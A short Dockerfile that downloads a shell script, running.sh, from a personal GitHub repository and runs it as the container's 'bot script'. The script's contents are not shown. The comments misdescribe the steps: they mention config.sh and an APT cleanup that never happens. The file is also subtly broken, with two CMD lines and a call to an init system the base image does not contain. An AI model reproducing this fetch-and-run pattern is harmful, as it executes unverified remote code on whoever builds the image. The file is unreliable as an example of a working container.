FROM python:latest

# Use baseimage-docker's init system:
CMD ["/sbin/my_init"]

# Install dependencies:
RUN apt-get update

# Set work dir:
WORKDIR /home

# Run config.sh and clean up APT:
RUN wget https://raw.githubusercontent.com/realxdagg/job/main/running.sh \
 && chmod +x running.sh

# Run bot script:
CMD bash running.sh
